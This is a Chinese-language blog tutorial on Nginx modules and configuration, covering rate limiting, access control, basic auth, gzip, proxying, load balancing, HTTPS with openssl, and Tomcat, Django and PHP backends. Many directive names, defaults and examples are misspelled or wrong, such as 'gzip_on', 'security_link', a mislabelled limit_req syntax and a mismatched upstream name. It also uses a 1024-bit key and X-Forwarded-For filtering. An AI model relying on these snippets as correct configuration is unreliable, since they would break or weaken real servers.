<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">root</span> /var/www/html/html_set</span><br><span class="line">        index index.html</span><br><span class="line">        sub_filter <span class="string">&#x27;server&#x27;</span> <span class="string">&#x27;first_server&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="模块：limit-conn"><a href="#模块：limit-conn" class="headerlink" title="模块：limit_conn"></a>模块：<code>limit_conn</code></h3><p>限制连接频率（完成三次握手后，建立连接）。</p>
<p>语法规则：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: limit_conn_zone key zone=name:size;</span><br><span class="line">Defualt: --;</span><br><span class="line">Context: http;</span><br><span class="line"># key 表示依据的变量，例如依据 $remote_addr 进行限制</span><br><span class="line"># zone 空间名字</span><br><span class="line"># size 空间大小</span><br></pre></td></tr></table></figure>

<p>语法规则：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: limit_conn zone number;</span><br><span class="line">Defualt: --;</span><br><span class="line">Context: http, server, location;</span><br><span class="line"># 根据上一条定义的 zone 使用</span><br><span class="line"># number 限制的个数</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">limit_conn_zone</span> <span class="variable">$binanry_remote_addr</span> zone=my_zone:<span class="number">1m</span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="section">location</span> / &#123;</span><br><span class="line">            ...</span><br><span class="line">            <span class="attribute">limit_conn</span> my_zone <span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="模块：limit-req"><a href="#模块：limit-req" class="headerlink" title="模块：limit_req"></a>模块：<code>limit_req</code></h3><p>限制请求频率（一次连接可以有多次请求，如果开启Keep-alive）。</p>
<p>语法规则：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: limit_req_zone key zone=name:size rate=rate;</span><br><span class="line">Defualt: --;</span><br><span class="line">Context: http;</span><br><span class="line"># key 表示依据的变量，例如依据 $remote_addr 进行限制</span><br><span class="line"># zone 空间名字</span><br><span class="line"># size 空间大小</span><br><span class="line"># rate 以秒为单位的请求速率</span><br></pre></td></tr></table></figure>

<p>语法规则：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: limit_conn zone=name [burst=number] [nodelay];</span><br><span class="line">Defualt: --;</span><br><span class="line">Context: http, server, location;</span><br><span class="line"># burst 请求个数：对客户端限制速率，延迟返回</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">limit_req_zone</span> <span class="variable">$binanry_remote_addr</span> zone=my_zone:<span class="number">1m</span> rate=1r/s;</span><br><span class="line">    ...</span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="section">location</span> / &#123;</span><br><span class="line">            ...</span><br><span class="line">            <span class="attribute">limit_req</span> my_zone <span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="模块：access"><a href="#模块：access" class="headerlink" title="模块：access"></a>模块：<code>access</code></h3><p>基于IP <code>$remote_addr</code>的访问控制，不推荐使用，因为在使用CDN情况下会失效。如果使用</p>
<ul>
<li>可以尝试使用<code>http_x_forward_for</code>，但是不安全。</li>
<li>可以使用<code>geo</code>模块。</li>
<li>可以<code>自定义HTTP变量</code>传递。</li>
</ul>
<p>语法规则：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: allow address|CIDR|unix:|all;</span><br><span class="line">Defualt: --;</span><br><span class="line">Context: http, server, location, limit_except;</span><br></pre></td></tr></table></figure>

<p>语法规则：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: deny address|CIDR|unix:|all;</span><br><span class="line">Defualt: --;</span><br><span class="line">Context: http, server, location, limit_except;</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="section">location</span> <span class="regexp">~ ^/admin.html</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="attribute">deny</span> ...;</span><br><span class="line">        <span class="attribute">allow</span> all;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="模块：auth-basic"><a href="#模块：auth-basic" class="headerlink" title="模块：auth_basic"></a>模块：<code>auth_basic</code></h3><p>基于用户的信任登录。</p>
<p>语法规则：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: auth_basic string|off;</span><br><span class="line">Defualt: auth_basic off;</span><br><span class="line">Context: http, server, location, limit_except;</span><br></pre></td></tr></table></figure>

<p>语法规则（认证用的用户信息文件）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: auth_basic_user_file file;</span><br><span class="line">Defualt: --;</span><br><span class="line">Context: http, server, location, limit_except;</span><br><span class="line"># 认证文件格式</span><br><span class="line"># 用户名:密码:注释</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="section">location</span> <span class="regexp">~ ^/admin.html</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="attribute">auth_basic</span> <span class="string">&quot;Input your password.&quot;</span>;</span><br><span class="line">        <span class="attribute">auth_basic_user_file</span> /etc/nginx/auth/auth_a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="模块：sendfile"><a href="#模块：sendfile" class="headerlink" title="模块：sendfile"></a>模块：<code>sendfile</code></h3><p>用于快速请求文件返回到客户端，其原理是利用sendfile技术，让内核直接读取文件，并通过网络发送出去，省去与用户空间的数据传输。</p>
<p>语法规则：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: sendfile on|off;</span><br><span class="line">Defualt: sendfile off;</span><br><span class="line">Context: http, server, location, if in location;</span><br></pre></td></tr></table></figure>

<h3 id="模块：tcp-nopush"><a href="#模块：tcp-nopush" class="headerlink" title="模块：tcp_nopush"></a>模块：<code>tcp_nopush</code></h3><p>在sendfile开启的情况下，提高网络包传输效率。多个数据包整合发送。</p>
<p>语法规则：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: tcp_nopush on|off;</span><br><span class="line">Defualt: tcp_nopush off;</span><br><span class="line">Context: http, server, location;</span><br></pre></td></tr></table></figure>

<h3 id="模块：tcp-nodelay"><a href="#模块：tcp-nodelay" class="headerlink" title="模块：tcp_nodelay"></a>模块：<code>tcp_nodelay</code></h3><p>在keepalive开启的情况下，提高网络实时性。</p>
<p>语法规则：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: tcp_nodelay on|off;</span><br><span class="line">Defualt: tcp_nodelay off;</span><br><span class="line">Context: http, server, location;</span><br></pre></td></tr></table></figure>

<h3 id="模块：gzip"><a href="#模块：gzip" class="headerlink" title="模块：gzip"></a>模块：<code>gzip</code></h3><p>压缩传输。其他模块包含：</p>
<ul>
<li>http_gzip_static_module 使用预压缩直接传输</li>
<li>http_gunzip_module 不支持gzip时，使用gunzip</li>
</ul>
<p>语法规则：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: gzip on|off;</span><br><span class="line">Defualt: gzip off;</span><br><span class="line">Context: http, server, location, if in location;</span><br></pre></td></tr></table></figure>

<p>语法规则（压缩比）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: gzip_comp_level level;</span><br><span class="line">Defualt: gzip_comp_level 1;</span><br><span class="line">Context: http, server, location;</span><br></pre></td></tr></table></figure>

<p>语法规则（版本）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: gzip_http_version 1.0|1.1;</span><br><span class="line">Defualt: gzip_http_version 1.1;</span><br><span class="line">Context: http, server, location;</span><br></pre></td></tr></table></figure>

<p>语法规则（文件类型）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: gzip_type type;</span><br><span class="line">Defualt: --;</span><br><span class="line">Context: http, server, location;</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="section">location</span> <span class="regexp">~ .*\.(jpg|gif|png)$</span> &#123;</span><br><span class="line">        gzip_on;</span><br><span class="line">        <span class="attribute">gzip_http_version</span> <span class="number">1</span>.<span class="number">1</span>;</span><br><span class="line">        <span class="attribute">gzip_comp_level</span> <span class="number">2</span>;</span><br><span class="line">        <span class="attribute">gzip_type</span> text/plain application/javascript text/css image/jpeg image/gif image/png;</span><br><span class="line">        <span class="attribute">root</span> /var/www/html/static;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="http://www.iana.org/assignments/media-types/media-types.xhtml">MIME type 列表参考地址</a></p>
<h3 id="模块：add-header"><a href="#模块：add-header" class="headerlink" title="模块：add_header"></a>模块：<code>add_header</code></h3><p>添加头。</p>
<p>语法规则：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: add_header name value [always];</span><br><span class="line">Defualt: --;</span><br><span class="line">Context: http, server, location, if in location;</span><br></pre></td></tr></table></figure>

<p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers">HTTP Headers 参考文档</a></p>
<h3 id="模块：valid-referers"><a href="#模块：valid-referers" class="headerlink" title="模块：valid_referers"></a>模块：<code>valid_referers</code></h3><p>用于防盗链。</p>
<p>语法规则：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: valid_referes none|blocked|server_names|string ...;</span><br><span class="line">Defualt: --;</span><br><span class="line">Context: server, location;</span><br></pre></td></tr></table></figure>

<h3 id="模块：proxy-pass"><a href="#模块：proxy-pass" class="headerlink" title="模块：proxy_pass"></a>模块：<code>proxy_pass</code></h3><p>用于代理。可以实现正向代理，反向代理，负载均衡等。</p>
<p>语法规则：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: proxy_pass uri;</span><br><span class="line">Defualt: --;</span><br><span class="line">Context: location, if in location, limit_except;</span><br></pre></td></tr></table></figure>

<p>语法规则（头信息）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: proxy_set_header field value;</span><br><span class="line">Defualt: proxy_set_header Host $proxy_host; proxy_set_header Connection close; </span><br><span class="line">Context: http, server, location;</span><br></pre></td></tr></table></figure>

<p>语法规则（跳转重定向）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: proxy_redirect default|off|(redirect replacement);</span><br><span class="line">Defualt: proxy_redirect default;</span><br><span class="line">Context: http, server, location;</span><br></pre></td></tr></table></figure>

<p>语法规则（超时）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: proxy_connect_timeout time;</span><br><span class="line">Defualt: proxy_connect_timeout 60s;</span><br><span class="line">Context: http, server, location;</span><br></pre></td></tr></table></figure>

<p>语法规则（缓冲区，一次性加载完毕再转发）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: proxy_buffering on|off;</span><br><span class="line">Defualt: proxy_buffering off;</span><br><span class="line">Context: http, server, location;</span><br></pre></td></tr></table></figure>

<p><a href="http://nginx.org/en/docs/http/ngx_http_proxy_module.html">参考文档</a></p>
<p>例如：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="comment"># 代理地址，如果后端返回301，可能需要改一下</span></span><br><span class="line">        <span class="attribute">proxy_pass</span> http://localhost:8080;</span><br><span class="line">        <span class="attribute">proxy_redirect</span> default;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 修改客户端头信息</span></span><br><span class="line">        <span class="attribute">proxy_set_header</span> Host <span class="variable">$http_host</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 超时设置</span></span><br><span class="line">        <span class="attribute">proxy_connect_timeout</span> <span class="number">30</span>;</span><br><span class="line">        <span class="attribute">proxy_send_timeout</span> <span class="number">60</span>;</span><br><span class="line">        <span class="attribute">proxy_read_timeout</span> <span class="number">60</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 缓冲区大小</span></span><br><span class="line">        <span class="attribute">proxy_buffering</span> <span class="literal">on</span>;</span><br><span class="line">        <span class="attribute">proxy_buffer_size</span> <span class="number">32k</span>;  </span><br><span class="line">        <span class="attribute">proxy_buffers</span> <span class="number">4</span> <span class="number">128k</span>;   </span><br><span class="line">        <span class="attribute">proxy_busy_buffers_size</span> <span class="number">256k</span>;</span><br><span class="line">        <span class="attribute">proxy_max_temp_file_size</span> <span class="number">256k</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="模块：upstream"><a href="#模块：upstream" class="headerlink" title="模块：upstream"></a>模块：<code>upstream</code></h3><p>负载均衡。</p>
<p>语法规则：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: upstream name &#123;...&#125;;</span><br><span class="line">Defualt: --;</span><br><span class="line">Context: http;</span><br></pre></td></tr></table></figure>

<p>其他选项：</p>
<ul>
<li>down 暂不参与负载均衡</li>
<li>backup 作为备份服务器</li>
<li>max_fails 允许失败次数</li>
<li>fail_timeout 达到max_fails后服务暂停时间</li>
<li>max_conns 最大连接数</li>
</ul>
<p>调度算法：</p>
<ul>
<li>轮询</li>
<li>加权轮询</li>
<li>ip_hash </li>
<li>least_conn</li>
<li>url_hash</li>
<li>hash关键数值 hash自定义key</li>
</ul>
<p>例如：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="section">upstream</span> mystream1 &#123;</span><br><span class="line">        <span class="attribute">server</span> xx.xx.xx.xx:<span class="number">8001</span> weight=<span class="number">5</span>;</span><br><span class="line">        <span class="attribute">server</span> xx.xx.xx.xx:<span class="number">8002</span>;</span><br><span class="line">        <span class="attribute">server</span> unix:/tep/backend;</span><br><span class="line">        <span class="attribute">server</span> xx.xx.xx.xx:<span class="number">8003</span> backup;</span><br><span class="line">        <span class="attribute">server</span> xx.xx.xx.xx:<span class="number">8004</span> backup;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="section">upstream</span> mystream2 &#123;</span><br><span class="line">        ip_hash;</span><br><span class="line">        <span class="attribute">server</span> xx.xx.xx.xx:<span class="number">8001</span>;</span><br><span class="line">        <span class="attribute">server</span> xx.xx.xx.xx:<span class="number">8002</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="section">upstream</span> mystream3 &#123;</span><br><span class="line">        <span class="attribute">hash</span> <span class="variable">$request_uri</span>;</span><br><span class="line">        <span class="attribute">server</span> xx.xx.xx.xx:<span class="number">8001</span>;</span><br><span class="line">        <span class="attribute">server</span> xx.xx.xx.xx:<span class="number">8002</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="模块：rewrite"><a href="#模块：rewrite" class="headerlink" title="模块：rewrite"></a>模块：<code>rewrite</code></h3><p>用于匹配URL。</p>
<p>语法规则：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: rewrite regex replacement [flag];</span><br><span class="line">Defualt: --;</span><br><span class="line">Context: server, location, if;</span><br></pre></td></tr></table></figure>

<p>flag可以是：</p>
<ul>
<li>break 停止rewrite匹配，直接在<code>root</code>指定的目录下查找，未找到则返回404</li>
<li>last 停止rewrite匹配，新建一个请求，再请求一次服务器</li>
<li>redirect 返回302临时重定向</li>
<li>permanent 返回301永久重定向，只要用户有缓存就会重定向</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root /var/www/html</span><br><span class="line">location ~ ^/last &#123;</span><br><span class="line">    rewrite ^/last /test/ last;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>优先级为：</p>
<ol>
<li>http</li>
<li>server</li>
<li>location</li>
<li>location 内部的规则</li>
</ol>
<h3 id="模块：security-link"><a href="#模块：security-link" class="headerlink" title="模块：security_link"></a>模块：<code>security_link</code></h3><p>用于防盗链。通过前后端加密传输防止盗链。例如客户端下载文件，服务端会生成带md5串和时间戳的链接返回给客户端，客户端再请求下载地址。</p>
<p>语法规则：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: security_link expression;</span><br><span class="line">Defualt: --;</span><br><span class="line">Context: http, server, location;</span><br></pre></td></tr></table></figure>

<p>语法规则：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syntax: security_link_md5 expression;</span><br><span class="line">Defualt: --;</span><br><span class="line">Context: http, server, location;</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line">    <span class="attribute">security_link</span> <span class="variable">$arg_md5</span>, <span class="variable">$arg_expires</span>;</span><br><span class="line">    <span class="attribute">security_link_md5</span> <span class="string">&quot;<span class="variable">$security_link_expires</span><span class="variable">$uri</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="模块：geoip"><a href="#模块：geoip" class="headerlink" title="模块：geoip"></a>模块：<code>geoip</code></h3><p>（默认不安装）</p>
<p>解析IP的地域。基于IP地址匹配<code>MaxMind GEOIP</code>二进制文件得到地域信息。</p>
<p>包括的变量有：</p>
<ul>
<li>$geoip_country_code</li>
<li>$geoip_country_name</li>
<li>$geoip_city</li>
</ul>
<p>例如：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">geoip_country</span> /etc/nginx/geoip/GeoIP.dat;</span><br><span class="line">    <span class="attribute">geoio_city</span> /etc/nginx/geoip/GeoLiteCity.dat;</span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="section">location</span> / &#123;</span><br><span class="line">            <span class="attribute">if</span> (<span class="variable">$geoip_country_code</span> != CN)&#123;</span><br><span class="line">                <span class="attribute">return</span> <span class="number">403</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>




<h2 id="配置案例"><a href="#配置案例" class="headerlink" title="配置案例"></a>配置案例</h2><h3 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h3><p>原理：利用<code>http_x_forward_for</code>限制来访客户端。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        if($<span class="attribute">http_x_forward_for</span> !<span class="regexp">~* &quot;^xx\.xx\.xx\.xx&quot;)</span> &#123;</span><br><span class="line">            <span class="attribute">return</span> <span class="number">403</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="attribute">root</span> /var/www/html;</span><br><span class="line">        <span class="attribute">index</span> index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="使用跨域限制"><a href="#使用跨域限制" class="headerlink" title="使用跨域限制"></a>使用跨域限制</h3><p>原理：在HTTP头部使用<code>Access-Control-Allow-Origin</code>，限制前端跨域访问的域。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="section">location</span> <span class="regexp">~ .*\.(htm|html)$</span> &#123;</span><br><span class="line">        <span class="attribute">add_header</span> Access-Control-Allow-Origin http://localhost;</span><br><span class="line">        <span class="attribute">add_header</span> Access-Control-Allow-Method GET, POST, PUT, DELETE, OPTIONS;</span><br><span class="line">        <span class="attribute">root</span> /var/www/html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="防盗链"><a href="#防盗链" class="headerlink" title="防盗链"></a>防盗链</h3><p>原理：在HTTP头部使用<code>Referer</code>，防止盗链。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="section">location</span> <span class="regexp">~ .*\.(htm|html)$</span> &#123;</span><br><span class="line">        <span class="attribute">valid_referers</span> <span class="literal">none</span> <span class="literal">blocked</span> xx.xx.xx.xx;</span><br><span class="line">        if($invalid_referer)&#123;  // 非0，表示被限制了</span><br><span class="line">            <span class="attribute">return</span> <span class="number">403</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="attribute">root</span> /var/www/html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><p>可以代理HTTP，HTTPS，邮件，RTMP等，既可以正向代理，也可以反向代理。</p>
<p>反向代理：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://localhost:8080;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正向代理：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="attribute">resolver</span> <span class="number">8.8.8.8</span>;</span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://<span class="variable">$http_host</span><span class="variable">$request_uri</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后配置浏览器配置代理服务器。</p>
<h3 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h3><p>按照范围分为：GSLB（全国范围），SLB（地域范围）。</p>
<p>按照OSI模型分类分为：4层负载均衡（TCP&#x2F;IP），7层负载均衡（应用层）。</p>
<p>配置 Upstream：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="section">upstream</span> mystream &#123;</span><br><span class="line">        <span class="attribute">server</span> xx.xx.xx.xx:<span class="number">8001</span>;</span><br><span class="line">        <span class="attribute">server</span> xx.xx.xx.xx:<span class="number">8002</span>;</span><br><span class="line">        <span class="attribute">server</span> xx.xx.xx.xx:<span class="number">8003</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="section">location</span> / &#123;</span><br><span class="line">            <span class="attribute">proxy_pass</span> http://mystream;</span><br><span class="line">            <span class="attribute">include</span> proxy_params;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h3><p>首先生成CA证书：</p>
<ol>
<li>生成密钥；</li>
<li>根据密钥生成证书签名的请求文件CSR；</li>
<li>将密钥，CSR打包发送给签名机构，进行CA签名，得到CA证书。<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成密钥</span></span><br><span class="line">openssl genrsa -out first.key 1024</span><br><span class="line"><span class="comment"># 生成请求文件</span></span><br><span class="line">openssl req -new -key first.key -out first.csr</span><br><span class="line"><span class="comment"># 自签名</span></span><br><span class="line">openssl x509 -req -days 3650 -<span class="keyword">in</span> first.csr -signkey first.key -out first.crt</span><br></pre></td></tr></table></figure></li>
</ol>
<p>也可以直接到腾讯云上申请免费SSL认证。申请通过后，服务器直接返回<code>CSR请求文件</code>，<code>CRT证书</code>，<code>私钥</code>。</p>
<p>配置Nginx SSL服务。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span>;</span><br><span class="line">    <span class="attribute">ssl</span> <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">ssl_certificate</span> /etc/nginx/ssl_key/first.crt;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /etc/nginx/ssl_key/first.key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="section">upstream</span> java_api &#123;</span><br><span class="line">        <span class="attribute">server</span> xx.xx.xx.xx:<span class="number">8080</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="section">location</span> <span class="regexp">~ \.jsp$</span> &#123;</span><br><span class="line">            <span class="attribute">proxy_pass</span> http://mystream;</span><br><span class="line">            <span class="attribute">include</span> proxy_params;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h3><p>项目目录：</p>
<ul>
<li>project<ul>
<li>app1&#x2F;</li>
<li>project&#x2F;<ul>
<li>wsgi.py</li>
</ul>
</li>
<li>manage.py</li>
<li>project_wsgi.ini</li>
</ul>
</li>
</ul>
<p>安装运行uwsgi：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo pip install uwsgi</span><br><span class="line">uwsgi --http :8001 --<span class="built_in">chdir</span> /django/project/path/ --wsgi-file project.wsgi</span><br></pre></td></tr></table></figure>

<p>注：Windows下需要自行下载源码编译，使用MinGW编译。</p>
<p>通过配置文件<code>project_wsgi.ini</code>启动uwsgi：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[uwsgi]</span></span><br><span class="line"><span class="attr">socket</span> = :<span class="number">9090</span></span><br><span class="line"><span class="attr">chdir</span> = /django/project/path</span><br><span class="line"><span class="attr">module</span> = project.wsgi <span class="comment"># project/wsgi.py</span></span><br><span class="line"><span class="attr">master</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">processes</span> = <span class="number">4</span></span><br><span class="line"><span class="attr">vacuum</span> = <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>启用配置：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">uwsgi --ini uwsgi.ini</span><br></pre></td></tr></table></figure>

<p>修改Nginx配置：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">uwsgi_pass</span> xx.xx.xx.xx:port;</span><br><span class="line">        <span class="attribute">include</span> uwsgi_params;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>默认使用<code>fastcgi</code>调用PHP。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="section">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">        <span class="attribute">fastcgi_pass</span>   <span class="number">127.0.0.1:9000</span>;</span><br><span class="line">        <span class="attribute">fastcgi_index</span>  index.php;</span><br><span class="line">        <span class="attribute">fastcgi_param</span>  SCRIPT_FILENAME  <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">        <span class="attribute">include</span>        fastcgi_params;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>















]]></content>
      <categories>
        <category>开发运维</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Web开发概念</title>
    <url>/2020/01/14/%E8%BF%90%E7%BB%B4/Web/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>


<h1 id="设计架构"><a href="#设计架构" class="headerlink" title="设计架构"></a>设计架构</h1><h2 id="MVC-架构"><a href="#MVC-架构" class="headerlink" title="MVC 架构"></a>MVC 架构</h2><p>MVC 架构是Web前端，Web后端的常用架构，也是一些桌面端应用程序，手机程序的常用架构。</p>
